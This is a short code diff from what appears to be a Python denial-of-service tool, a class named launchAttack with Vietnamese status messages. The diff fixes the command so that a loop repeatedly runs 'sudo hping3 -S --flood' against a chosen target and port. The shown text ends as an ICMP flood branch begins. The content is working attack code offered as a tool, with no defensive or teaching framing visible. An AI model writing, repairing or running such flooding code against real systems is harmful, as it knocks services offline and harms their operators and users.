@@ -16,7 +16,7 @@ class launchAttack:
         if choice == "1":
             print("Thực hiện TCP Flood...")
             while self._running:
-                subprocess.Popen(f'sudo hping 3 -S --flood -p {port} {target}', shell=True, preexec_fn=os.setsid)
+                subprocess.Popen(f'sudo hping3 -S --flood -p {port} {target}', shell=True, preexec_fn=os.setsid)
 
         elif choice == "2":
             print("Thực hiện Hping3 ICMP Flood...")
